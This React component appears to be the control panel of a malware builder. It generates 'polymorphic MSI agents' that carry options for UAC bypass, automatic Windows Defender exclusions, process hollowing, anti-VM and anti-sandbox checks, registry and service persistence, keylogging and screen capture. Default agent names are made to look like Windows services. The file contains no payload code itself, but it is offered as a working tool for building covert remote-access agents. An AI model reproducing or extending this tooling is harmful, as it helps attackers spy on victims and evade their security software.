import React, { useState, useEffect, useRef } from 'react';
import { Download, Settings, Zap, Eye, EyeOff, RefreshCw, AlertCircle, Trash2 } from 'lucide-react';
import { agentService, AgentBuild as AgentBuildType, templateService, AgentTemplate as AgentTemplateType } from '../services/agentService';
import { WS_URL } from '../config';

// Use AgentBuildType from service

interface AgentConfig {
  // Basic Configuration
  agentName: string;
  serviceName: string;
  description: string;
  
  // Evasion Settings
  enablePolymorphicNaming: boolean;
  enableUACBypass: boolean;
  enableDefenderExclusion: boolean;
  enableProcessHollowing: boolean;
  enableMemoryEvasion: boolean;
  
  // Stealth Settings
  enableAntiDebug: boolean;
  enableAntiVM: boolean;
  enableAntiSandbox: boolean;
  enableCodeObfuscation: boolean;
  enableStringEncryption: boolean;
  
  // Persistence Settings
  enableServiceInstallation: boolean;
  enableRegistryPersistence: boolean;
  enableScheduledTask: boolean;
  enableStartupFolder: boolean;
  
  // Communication Settings
  serverUrl: string;
  serverPort: number;
  heartbeatInterval: number;
  reconnectAttempts: number;
  
  // Advanced Features
  enableKeylogger: boolean;
  enableScreenCapture: boolean;
  enableFileManager: boolean;
  enableProcessManager: boolean;
  enableNetworkMonitor: boolean;
  enableSystemInfo: boolean;
}

const AgentSection: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'generate' | 'config' | 'builds' | 'templates'>('generate');
  const [agentConfig, setAgentConfig] = useState<AgentConfig>({
    agentName: '',
    serviceName: '',
    description: '',
    enablePolymorphicNaming: true,
    enableUACBypass: true,
    enableDefenderExclusion: true,
    enableProcessHollowing: true,
    enableMemoryEvasion: true,
    enableAntiDebug: true,
    enableAntiVM: true,
    enableAntiSandbox: true,
    enableCodeObfuscation: true,
    enableStringEncryption: true,
    enableServiceInstallation: true,
    enableRegistryPersistence: true,
    enableScheduledTask: false,
    enableStartupFolder: false,
    serverUrl: 'localhost',
    serverPort: 8080,
    heartbeatInterval: 30,
    reconnectAttempts: 5,
    enableKeylogger: true,
    enableScreenCapture: true,
    enableFileManager: true,
    enableProcessManager: true,
    enableNetworkMonitor: true,
    enableSystemInfo: true
  });

  const [agentBuilds, setAgentBuilds] = useState<AgentBuildType[]>([]);
  const [isGenerating, setIsGenerating] = useState(false);
  const [generationProgress, setGenerationProgress] = useState<{ [key: string]: number }>({});
  const [showPasswords, setShowPasswords] = useState<{ [key: string]: boolean }>({});
  const [copiedPasswords, setCopiedPasswords] = useState<{ [key: string]: boolean }>({});
  const [showAdvanced, setShowAdvanced] = useState(false);
  const wsRef = useRef<WebSocket | null>(null);
  const [templates, setTemplates] = useState<AgentTemplateType[]>([]);
  const [showTemplateModal, setShowTemplateModal] = useState(false);
  const [templateName, setTemplateName] = useState('');
  const [templateDescription, setTemplateDescription] = useState('');
  const [templateIsPublic, setTemplateIsPublic] = useState(false);

  const handleConfigChange = (key: keyof AgentConfig, value: any) => {
    setAgentConfig(prev => ({ ...prev, [key]: value }));
  };

  const generateRandomName = () => {
    const prefixes = ['WindowsUpdate', 'WindowsSecurity', 'WindowsDefender', 'WindowsFirewall', 'WindowsBackup', 'WindowsSearch'];
    const suffixes = ['Service', 'Agent', 'Manager', 'Controller', 'Handler', 'Processor'];
    const numbers = Math.floor(Math.random() * 9000) + 1000;
    
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    
    return `${prefix}${suffix}${numbers}`;
  };

  const togglePasswordVisibility = (buildId: string) => {
    setShowPasswords(prev => ({
      ...prev,
      [buildId]: !prev[buildId]
    }));
  };

  const copyPassword = async (password: string, buildId: string) => {
    try {
      await navigator.clipboard.writeText(password);
      setCopiedPasswords(prev => ({
        ...prev,
        [buildId]: true
      }));
      
      // Reset after 2 seconds
      setTimeout(() => {
        setCopiedPasswords(prev => ({
          ...prev,
          [buildId]: false
        }));
      }, 2000);
    } catch (err) {
      console.error('Failed to copy password:', err);
    }
  };

  // Display password modal/popup when password is shown
  const getPasswordDisplay = (build: AgentBuildType) => {
    if (!showPasswords[build._id]) return null;
    const password = build.metadata?.password || '';
    return (
      <div className="mt-2 p-2 bg-gray-800 rounded text-sm">
        <div className="flex items-center justify-between">
          <span className="text-white font-mono">{password}</span>
          <button
            onClick={() => copyPassword(password, build._id)}
            className="ml-2 text-blue-400 hover:text-blue-300"
          >
            {copiedPasswords[build._id] ? 'Copied!' : 'Copy'}
          </button>
        </div>
      </div>
    );
  };

  // Fetch builds and templates on mount
  useEffect(() => {
    fetchBuilds();
    fetchTemplates();
  }, []);

  // Fetch templates when templates tab is active
  useEffect(() => {
    if (activeTab === 'templates') {
      fetchTemplates();
    }
  }, [activeTab]);

  // WebSocket connection for real-time updates
  useEffect(() => {
    const token = localStorage.getItem('accessToken');
    if (!token) return;

    const ws = new WebSocket(WS_URL);
    wsRef.current = ws;

    ws.onopen = () => {
      console.log('[AgentSection] WebSocket connected');
      ws.send(JSON.stringify({
        type: 'web_client',
        token: token
      }));
    };

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === 'build_queued' || data.type === 'build_progress' || 
            data.type === 'build_completed' || data.type === 'build_error' || 
            data.type === 'build_deleted') {
          handleBuildEvent(data);
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };

    ws.onerror = (error) => {
      console.error('[AgentSection] WebSocket error:', error);
    };

    ws.onclose = () => {
      console.log('[AgentSection] WebSocket disconnected');
      // Reconnect after 5 seconds
      setTimeout(() => {
        if (wsRef.current?.readyState === WebSocket.CLOSED) {
          // Reconnect logic handled by useEffect
        }
      }, 5000);
    };

    return () => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.close();
      }
    };
  }, []);

  const fetchBuilds = async () => {
    try {
      const result = await agentService.getBuilds({ limit: 50 });
      setAgentBuilds(result.builds);
    } catch (error) {
      console.error('Error fetching builds:', error);
    }
  };

  const handleBuildEvent = (data: any) => {
    if (data.type === 'build_deleted') {
      setAgentBuilds(prev => prev.filter(build => build._id !== data.buildId));
      return;
    }

    if (data.type === 'build_queued') {
      // Build will be added when we fetch or receive progress
      fetchBuilds();
      return;
    }

    if (data.type === 'build_progress') {
      setGenerationProgress(prev => ({
        ...prev,
        [data.buildId]: data.progress
      }));
      
      // Update build in list
      setAgentBuilds(prev => prev.map(build => 
        build._id === data.buildId 
          ? { ...build, status: data.status, progress: data.progress }
          : build
      ));
      
      // If build not in list, fetch it
      if (!agentBuilds.find(b => b._id === data.buildId)) {
        fetchBuilds();
      }
      return;
    }

    if (data.type === 'build_completed' || data.type === 'build_error') {
      fetchBuilds(); // Refresh to get full build data
      setGenerationProgress(prev => {
        const newProgress = { ...prev };
        delete newProgress[data.buildId];
        return newProgress;
      });
    }
  };

  const handleGenerateAgent = async () => {
    setIsGenerating(true);

    try {
      const build = await agentService.generateAgent(agentConfig);
      
      // Add to list immediately
      setAgentBuilds(prev => [build, ...prev]);
      setGenerationProgress(prev => ({
        ...prev,
        [build._id]: 0
      }));
      
    } catch (error: any) {
      console.error('Error generating agent:', error);
      alert(error.message || 'Failed to generate agent. Please try again.');
    } finally {
      setIsGenerating(false);
    }
  };

  const handleDeleteBuild = async (buildId: string) => {
    if (!confirm('Are you sure you want to delete this build?')) {
      return;
    }

    try {
      await agentService.deleteBuild(buildId);
      setAgentBuilds(prev => prev.filter(build => build._id !== buildId));
    } catch (error: any) {
      console.error('Error deleting build:', error);
      alert(error.message || 'Failed to delete build');
    }
  };

  const handleDownloadBuild = async (build: AgentBuildType) => {
    try {
      const blob = await agentService.downloadBuild(build._id);
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `agent_${build.agentId}.zip`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error: any) {
      console.error('Error downloading build:', error);
      alert(error.message || 'Failed to download build');
    }
  };

  const fetchTemplates = async () => {
    try {
      const result = await templateService.getTemplates({ limit: 50 });
      setTemplates(result.templates);
    } catch (error) {
      console.error('Error fetching templates:', error);
    }
  };

  const handleUseTemplate = async (templateId: string) => {
    try {
      const config = await templateService.useTemplate(templateId);
      setAgentConfig(config);
      setActiveTab('generate');
      fetchTemplates(); // Refresh to update usage count
    } catch (error: any) {
      console.error('Error using template:', error);
      alert(error.message || 'Failed to load template');
    }
  };

  const handleSaveTemplate = async () => {
    if (!templateName.trim()) {
      alert('Template name is required');
      return;
    }

    try {
      await templateService.createTemplate(templateName, templateDescription, agentConfig, templateIsPublic);
      setShowTemplateModal(false);
      setTemplateName('');
      setTemplateDescription('');
      setTemplateIsPublic(false);
      fetchTemplates();
      alert('Template saved successfully!');
    } catch (error: any) {
      console.error('Error saving template:', error);
      alert(error.message || 'Failed to save template');
    }
  };

  const handleDeleteTemplate = async (templateId: string) => {
    if (!confirm('Are you sure you want to delete this template?')) {
      return;
    }

    try {
      await templateService.deleteTemplate(templateId);
      fetchTemplates();
    } catch (error: any) {
      console.error('Error deleting template:', error);
      alert(error.message || 'Failed to delete template');
    }
  };

  const renderGenerateTab = () => (
    <div className="space-y-6">
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🚀 Generate New Agent
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Agent Name
            </label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={agentConfig.agentName}
                onChange={(e) => handleConfigChange('agentName', e.target.value)}
                placeholder="Enter agent name"
                className="flex-1 px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
              />
              <button
                onClick={() => handleConfigChange('agentName', generateRandomName())}
                className="px-3 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
              >
                <RefreshCw className="w-4 h-4" />
              </button>
            </div>
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Service Name
            </label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={agentConfig.serviceName}
                onChange={(e) => handleConfigChange('serviceName', e.target.value)}
                placeholder="Enter service name"
                className="flex-1 px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
              />
              <button
                onClick={() => handleConfigChange('serviceName', generateRandomName())}
                className="px-3 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
              >
                <RefreshCw className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>

        <div className="mt-4">
          <label className="block text-sm font-medium text-black dark:text-white mb-2">
            Description
          </label>
          <textarea
            value={agentConfig.description}
            onChange={(e) => handleConfigChange('description', e.target.value)}
            placeholder="Enter agent description"
            rows={3}
            className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
          />
        </div>
      </div>

      {/* Active Build Progress */}
      {Object.keys(generationProgress).length > 0 && (
        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
          <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
            🔄 Active Builds
          </h3>
          
          <div className="space-y-4">
            {Object.entries(generationProgress).map(([buildId, progress]) => {
              const build = agentBuilds.find(b => b._id === buildId);
              if (!build) return null;
              
              return (
                <div key={buildId} className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-black dark:text-white">{build.name}</span>
                    <span className="text-bodydark2">{progress}%</span>
                  </div>
                  <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                    <div 
                      className="bg-primary h-2 rounded-full transition-all duration-300"
                      style={{ width: `${progress}%` }}
                    ></div>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Generate Button */}
      <div className="flex justify-center">
        <button
          onClick={handleGenerateAgent}
          disabled={isGenerating || !agentConfig.agentName || !agentConfig.serviceName}
          className="px-8 py-3 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
        >
          <Zap className="w-5 h-5 mr-2" />
          {isGenerating ? 'Generating...' : 'Generate Agent'}
        </button>
      </div>
    </div>
  );

  const renderConfigTab = () => (
    <div className="space-y-6">
      {/* Evasion Settings */}
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🛡️ Evasion Settings
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { key: 'enablePolymorphicNaming', label: 'Polymorphic Naming', desc: 'Generate unique names each build' },
            { key: 'enableUACBypass', label: 'UAC Bypass', desc: 'Bypass User Account Control' },
            { key: 'enableDefenderExclusion', label: 'Defender Exclusion', desc: 'Auto-add Windows Defender exclusions' },
            { key: 'enableProcessHollowing', label: 'Process Hollowing', desc: 'Inject into legitimate processes' },
            { key: 'enableMemoryEvasion', label: 'Memory Evasion', desc: 'Advanced memory protection' },
            { key: 'enableAntiDebug', label: 'Anti-Debug', desc: 'Detect and evade debugging' },
            { key: 'enableAntiVM', label: 'Anti-VM', desc: 'Detect virtual machines' },
            { key: 'enableAntiSandbox', label: 'Anti-Sandbox', desc: 'Detect sandbox environments' },
            { key: 'enableCodeObfuscation', label: 'Code Obfuscation', desc: 'Obfuscate code structure' },
            { key: 'enableStringEncryption', label: 'String Encryption', desc: 'Encrypt all strings' }
          ].map((setting) => (
            <div key={setting.key} className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg">
              <div>
                <h4 className="font-medium text-black dark:text-white">{setting.label}</h4>
                <p className="text-sm text-bodydark2">{setting.desc}</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={agentConfig[setting.key as keyof AgentConfig] as boolean}
                  onChange={(e) => handleConfigChange(setting.key as keyof AgentConfig, e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/20 dark:peer-focus:ring-primary/20 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-primary"></div>
              </label>
            </div>
          ))}
        </div>
      </div>

      {/* Persistence Settings */}
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🔄 Persistence Settings
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { key: 'enableServiceInstallation', label: 'Service Installation', desc: 'Install as Windows service' },
            { key: 'enableRegistryPersistence', label: 'Registry Persistence', desc: 'Add registry entries' },
            { key: 'enableScheduledTask', label: 'Scheduled Task', desc: 'Create scheduled task' },
            { key: 'enableStartupFolder', label: 'Startup Folder', desc: 'Add to startup folder' }
          ].map((setting) => (
            <div key={setting.key} className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg">
              <div>
                <h4 className="font-medium text-black dark:text-white">{setting.label}</h4>
                <p className="text-sm text-bodydark2">{setting.desc}</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={agentConfig[setting.key as keyof AgentConfig] as boolean}
                  onChange={(e) => handleConfigChange(setting.key as keyof AgentConfig, e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/20 dark:peer-focus:ring-primary/20 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-primary"></div>
              </label>
            </div>
          ))}
        </div>
      </div>

      {/* Communication Settings */}
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          🌐 Communication Settings
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Server URL
            </label>
            <input
              type="text"
              value={agentConfig.serverUrl}
              onChange={(e) => handleConfigChange('serverUrl', e.target.value)}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Server Port
            </label>
            <input
              type="number"
              value={agentConfig.serverPort}
              onChange={(e) => handleConfigChange('serverPort', parseInt(e.target.value))}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Heartbeat Interval (seconds)
            </label>
            <input
              type="number"
              value={agentConfig.heartbeatInterval}
              onChange={(e) => handleConfigChange('heartbeatInterval', parseInt(e.target.value))}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-black dark:text-white mb-2">
              Reconnect Attempts
            </label>
            <input
              type="number"
              value={agentConfig.reconnectAttempts}
              onChange={(e) => handleConfigChange('reconnectAttempts', parseInt(e.target.value))}
              className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
            />
          </div>
        </div>
      </div>
    </div>
  );

  const renderBuildsTab = () => (
    <div className="space-y-6">
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
          📦 Agent Builds
        </h3>
        
        <div className="overflow-x-auto">
          <table className="w-full text-sm text-left text-gray-300">
            <thead className="text-xs text-gray-400 uppercase bg-gray-800">
              <tr>
                <th className="px-6 py-3">Name</th>
                <th className="px-6 py-3">Version</th>
                <th className="px-6 py-3">Status</th>
                <th className="px-6 py-3">Size</th>
                <th className="px-6 py-3">Created</th>
                <th className="px-6 py-3">Actions</th>
              </tr>
            </thead>
            <tbody>
              {agentBuilds.length === 0 ? (
                <tr>
                  <td colSpan={6} className="px-6 py-8 text-center text-gray-400">
                    No builds found. Generate your first agent to get started.
                  </td>
                </tr>
              ) : (
                agentBuilds.map((build) => (
                  <tr key={build._id} className="hover:bg-gray-700 transition-colors">
                    <td className="px-6 py-4">
                      <div className="font-medium text-white">{build.name}</div>
                      {build.description && (
                        <div className="text-xs text-gray-400">{build.description}</div>
                      )}
                    </td>
                    <td className="px-6 py-4 text-white">{build.version}</td>
                    <td className="px-6 py-4">
                      <span className={`px-2 py-1 text-xs font-medium rounded-full ${
                        build.status === 'ready' ? 'bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200' :
                        build.status === 'generating' || build.status === 'compiling' || build.status === 'packaging' ? 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-200' :
                        build.status === 'error' ? 'bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200' :
                        'bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-300'
                      }`}>
                        {build.status}
                        {build.progress !== undefined && build.progress > 0 && build.progress < 100 && (
                          <span className="ml-2">({build.progress}%)</span>
                        )}
                      </span>
                    </td>
                    <td className="px-6 py-4 text-white">
                      {build.fileSize ? `${(build.fileSize / 1024 / 1024).toFixed(2)} MB` : '-'}
                    </td>
                    <td className="px-6 py-4 text-white">
                      {new Date(build.createdAt).toLocaleString()}
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex space-x-2">
                        {build.status === 'ready' && (
                          <button 
                            onClick={() => handleDownloadBuild(build)}
                            className="text-blue-400 hover:text-blue-300"
                            title="Download Build"
                          >
                            <Download className="w-4 h-4" />
                          </button>
                        )}
                        {build.metadata?.password && (
                          <button 
                            onClick={() => togglePasswordVisibility(build._id)}
                            className="text-yellow-400 hover:text-yellow-300"
                            title="Show/Hide Password"
                          >
                            {showPasswords[build._id] ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        )}
                        <button 
                          onClick={() => handleDeleteBuild(build._id)}
                          className="text-red-400 hover:text-red-300"
                          title="Delete Build"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );

  const renderTemplatesTab = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h3 className="text-lg font-semibold text-black dark:text-white">
          📋 Agent Templates
        </h3>
        <button
          onClick={() => setShowTemplateModal(true)}
          className="px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors flex items-center"
        >
          <Settings className="w-4 h-4 mr-2" />
          Save Current Config as Template
        </button>
      </div>

      {templates.length === 0 ? (
        <div className="text-center py-12 bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark">
          <Settings className="w-12 h-12 text-gray-400 mx-auto mb-4" />
          <p className="text-bodydark2">No templates found. Save your first template to get started.</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {templates.map((template) => (
            <div
              key={template._id}
              className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6 hover:shadow-md transition-shadow"
            >
              <div className="flex justify-between items-start mb-4">
                <div>
                  <h4 className="font-semibold text-black dark:text-white">{template.name}</h4>
                  {template.description && (
                    <p className="text-sm text-bodydark2 mt-1">{template.description}</p>
                  )}
                </div>
                {template.isPublic && (
                  <span className="px-2 py-1 text-xs bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200 rounded">
                    Public
                  </span>
                )}
              </div>

              <div className="text-sm text-bodydark2 mb-4">
                <p>Used: {template.usageCount} times</p>
                {template.lastUsedAt && (
                  <p>Last used: {new Date(template.lastUsedAt).toLocaleDateString()}</p>
                )}
                {template.createdBy && (
                  <p>By: {template.createdBy.username}</p>
                )}
              </div>

              <div className="flex space-x-2">
                <button
                  onClick={() => handleUseTemplate(template._id)}
                  className="flex-1 px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors"
                >
                  Use Template
                </button>
                <button
                  onClick={() => handleDeleteTemplate(template._id)}
                  className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition-colors"
                  title="Delete Template"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Save Template Modal */}
      {showTemplateModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-boxdark rounded-lg shadow-lg p-6 w-full max-w-md">
            <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
              Save Template
            </h3>
            
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-black dark:text-white mb-2">
                  Template Name *
                </label>
                <input
                  type="text"
                  value={templateName}
                  onChange={(e) => setTemplateName(e.target.value)}
                  placeholder="Enter template name"
                  className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-black dark:text-white mb-2">
                  Description
                </label>
                <textarea
                  value={templateDescription}
                  onChange={(e) => setTemplateDescription(e.target.value)}
                  placeholder="Enter template description"
                  rows={3}
                  className="w-full px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white"
                />
              </div>

              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="templatePublic"
                  checked={templateIsPublic}
                  onChange={(e) => setTemplateIsPublic(e.target.checked)}
                  className="mr-2"
                />
                <label htmlFor="templatePublic" className="text-sm text-black dark:text-white">
                  Make this template public
                </label>
              </div>
            </div>

            <div className="flex justify-end space-x-2 mt-6">
              <button
                onClick={() => {
                  setShowTemplateModal(false);
                  setTemplateName('');
                  setTemplateDescription('');
                  setTemplateIsPublic(false);
                }}
                className="px-4 py-2 border border-stroke dark:border-strokedark rounded-lg text-black dark:text-white hover:bg-gray-100 dark:hover:bg-gray-800"
              >
                Cancel
              </button>
              <button
                onClick={handleSaveTemplate}
                className="px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90"
              >
                Save Template
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );

  return (
    <div className="space-y-6">
        {/* Header */}
        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
          <h1 className="text-2xl font-bold text-black dark:text-white mb-2">
            🤖 Agent Management
          </h1>
          <p className="text-bodydark2">
            Generate polymorphic MSI agents with advanced evasion techniques
          </p>
        </div>

        {/* Tab Navigation */}
        <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark">
          <div className="border-b border-stroke dark:border-strokedark">
            <nav className="flex space-x-8 px-6">
              {[
                { id: 'generate', label: '🚀 Generate', icon: '🚀' },
                { id: 'config', label: '⚙️ Configuration', icon: '⚙️' },
                { id: 'builds', label: '📦 Builds', icon: '📦' },
                { id: 'templates', label: '📋 Templates', icon: '📋' }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`py-4 px-1 border-b-2 font-medium text-sm transition-colors ${
                    activeTab === tab.id
                      ? 'border-primary text-primary'
                      : 'border-transparent text-bodydark2 hover:text-black dark:hover:text-white hover:border-gray-300'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </nav>
          </div>

          {/* Tab Content */}
          <div className="p-6">
            {activeTab === 'generate' && renderGenerateTab()}
            {activeTab === 'config' && renderConfigTab()}
            {activeTab === 'builds' && renderBuildsTab()}
            {activeTab === 'templates' && renderTemplatesTab()}
          </div>
        </div>
    </div>
  );
};

export default AgentSection;
